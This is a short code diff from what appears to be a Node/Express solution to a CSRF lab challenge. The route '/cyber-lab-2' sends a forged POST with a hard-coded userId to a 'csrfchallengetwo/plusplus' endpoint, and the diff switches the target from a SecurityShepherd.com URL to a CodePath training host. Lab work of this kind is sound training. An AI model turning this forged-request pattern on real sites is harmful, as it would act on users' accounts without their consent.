@@ -16,7 +16,7 @@ app.get('/', (request, response) => {
 app.get('/cyber-lab-2', (request, response) => {
 
     axios
-    .post('http://SecurityShepherd.com/user/csrfchallengetwo/plusplus', {
+    .post('https://security.codepath.com/user/csrfchallengetwo/plusplus', {
         userId: '338b543b8b18bb6f2aad43877efccb77e153f77d'
     })
     .then(res => {
